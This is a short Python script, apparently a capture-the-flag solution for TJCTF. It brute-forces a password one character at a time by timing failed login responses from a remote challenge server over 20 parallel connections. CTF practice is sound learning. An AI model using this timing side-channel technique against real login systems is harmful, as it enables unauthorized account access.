from timeit import default_timer as timer
from pwn import *
import string
from multiprocessing import Pool as ThreadPool

if __name__ == '__main__':

    charset = (string.printable.replace("\n", ""))#[:-38]+"+/="

    def charFunc(char):
        try:
            cons = "T"
            context.log_level = 'error'
            conn = remote('problem1.tjctf.org', 8003)
            conn.recvuntil('password?')
            conn.send('5000000\r\n')
            conn.recvuntil('password:')
            start = timer()
            payload = cons+char
            conn.send(payload+"\r\n")
            conn.recvuntil('failed!')
            end = timer()
            conn.close()
            return (char, end-start)
        except KeyboardInterrupt:
            exit(1)
        
    pool = ThreadPool(20)

    try:
        results = pool.map(charFunc, charset)
    except KeyboardInterrupt:
        pool.terminate()
        pool.close()
        print "You cancelled the program!"
        exit(1)
    print results